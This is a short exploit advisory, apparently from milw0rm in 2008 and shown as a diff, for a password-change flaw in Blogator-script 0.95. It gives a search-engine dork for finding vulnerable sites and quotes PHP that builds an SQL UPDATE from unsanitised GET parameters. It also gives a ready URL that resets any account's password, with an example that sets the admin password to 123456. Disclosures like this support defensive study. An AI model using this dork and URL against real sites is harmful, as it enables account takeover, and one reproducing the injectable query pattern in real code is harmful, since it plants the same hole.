@@ -1,0 +1,37 @@
+	     ##############################################################################
+             #                                                                            #
+             #  ...:::::Blogator-script 0.95 Change User Password Vulnerbility ::::....   #           
+             ##############################################################################
+
+Virangar Security Team
+
+www.virangar.org
+www.virangar.net
+
+--------
+Discoverd By :virangar security team(hadihadi)
+
+special tnx to:MR.nosrati,black.shadowes,MR.hesy,Zahra
+
+& all virangar members & all hackerz
+
+greetz:to my best friend in the world hadi_aryaie2004
+& my lovely friend arash(imm02tal) from emperor team :)
+-----------------------------------
+dork: inurl:/_blogadata/
+-----------------------------------
+vuln code in /_blogadata/include/init_pass2.php:
+line 23: $id=$_GET['a'];
+line 24:$email=$_GET['b'];
+line 25: $mdp=$_GET['c'];
+.....
+line 27: $sql_change_pass=mysql_query("UPDATE membre SET pass = '$mdp' WHERE id_membre = '$id' AND email LIKE '$email' LIMIT 1");
+
+so if we put user id for $id and put %(any) for user email($email) and $mdp=newpassword.....he he he :)
+------------
+vuln:
+http://www.site.com/_blogadata/include/init_pass2.php?c=[newpass]&a=[user id]&b=%
+example:(change admin pass to 123456)
+http://www.site.com/_blogadata/include/init_pass2.php?c=123456&a=1&b=%
+
+# milw0rm.com [2008-04-05]
